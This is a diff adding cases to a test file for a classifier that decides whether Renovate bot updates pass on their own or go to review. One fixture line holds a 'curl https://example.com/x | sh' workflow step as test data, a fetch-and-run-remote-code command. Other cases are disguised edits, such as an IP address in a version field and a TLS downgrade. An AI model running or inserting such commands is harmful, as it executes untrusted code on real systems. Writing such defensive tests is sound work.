@@ -109,6 +109,19 @@ test("classify lets through only a release pin or a version update Renovate put 
     ["a module update with indirect churn", [goMod, goSum], bot, "renovate"],
     ["a lock file refresh", [lock, goSum], bot, "renovate"],
     ["a tool version after its Renovate annotation", [annotated], bot, "renovate"],
+    [
+      "tool version inputs, quoted or bare",
+      [
+        file(
+          ".github/workflows/main.yaml",
+          ['          node-version: "24.21.0"'],
+          ['          node-version: "24.22.0"']
+        ),
+        file("action.yaml", ["        go-version: 1.25.1"], ["        go-version: 1.25.2"]),
+      ],
+      bot,
+      "renovate",
+    ],
     ["a shared preset bump", [preset], bot, "renovate"],
     ["an update Renovate left for review", [bump], null, "review"],
     ["an update the agent queued", [bump], "anovelbot-agent", "review"],
@@ -153,6 +166,42 @@ test("classify lets through only a release pin or a version update Renovate put 
           [action(sha("b"), "v7.0.1"), "        run: curl https://example.com/x | sh"]
         ),
       ],
+      bot,
+      "review",
+    ],
+    [
+      "a version input bundled with another input",
+      [
+        file(
+          ".github/workflows/main.yaml",
+          ['          node-version: "24.21.0"', "          timeout-minutes: 10"],
+          ['          node-version: "24.22.0"', "          timeout-minutes: 360"]
+        ),
+      ],
+      bot,
+      "review",
+    ],
+    [
+      "a dotted input other than a version",
+      [file(".github/workflows/main.yaml", ['          threshold: "0.80"'], ['          threshold: "0.10"'])],
+      bot,
+      "review",
+    ],
+    [
+      "an address under a version input",
+      [
+        file(
+          ".github/workflows/main.yaml",
+          ["          server-version: 10.20.0.6"],
+          ["          server-version: 203.0.113.7"]
+        ),
+      ],
+      bot,
+      "review",
+    ],
+    [
+      "a version key outside workflows and actions",
+      [file("config/server.yaml", ['  min-tls-version: "1.2"'], ['  min-tls-version: "1.0"'])],
       bot,
       "review",
     ],
